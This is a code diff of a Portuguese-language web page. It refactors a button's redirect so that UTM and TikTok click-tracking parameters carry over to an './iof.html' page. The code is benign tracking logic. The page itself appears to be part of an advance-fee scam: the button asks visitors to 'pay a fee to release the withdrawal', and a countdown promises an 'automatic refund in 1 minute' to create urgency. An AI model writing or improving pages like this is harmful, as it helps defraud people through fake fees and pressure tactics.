@@ -922,46 +922,19 @@
           <!-- Call to Action -->
           <div class="confirmation-section">
             <button
-              onclick="herdarUTMeRedirecionar('./iof'); return false;"
               class="confirmation-cta-button"
               id="confirmation-button"
             >
               Pagar taxa para Liberar Saque
             </button>
 
-            <script>
-              function herdarUTMeRedirecionar(urlDestino) {
-                // Pega os parâmetros da URL atual
-                const urlAtual = new URL(window.location.href);
-                const params = new URLSearchParams(urlAtual.search);
+            <script type="module">
+              import { redirectWithUtm } from './js/utm-helper.js';
 
-                // Filtra UTMs + ttclid
-                const parametrosParaHerdar = {};
-                for (const [key, value] of params.entries()) {
-                  if (
-                    key.startsWith("utm_") ||
-                    key === "ttclid" // <- novo parâmetro incluído
-                  ) {
-                    parametrosParaHerdar[key] = value;
-                  }
-                }
-
-                // Cria a URL de destino com os parâmetros herdados
-                const urlFinal = new URL(urlDestino);
-                const paramsDestino = new URLSearchParams(urlFinal.search);
-
-                // Adiciona os parâmetros herdados à URL de destino
-                for (const [key, value] of Object.entries(
-                  parametrosParaHerdar
-                )) {
-                  paramsDestino.set(key, value);
-                }
-
-                urlFinal.search = paramsDestino.toString();
-
-                // Redireciona na mesma página
-                window.location.href = urlFinal.toString();
-              }
+              document.getElementById('confirmation-button').addEventListener('click', function(e) {
+                e.preventDefault();
+                redirectWithUtm('./iof.html');
+              });
             </script>
             <div class="confirmation-timer">
               ⏱️ Reembolso automático em 1 minuto
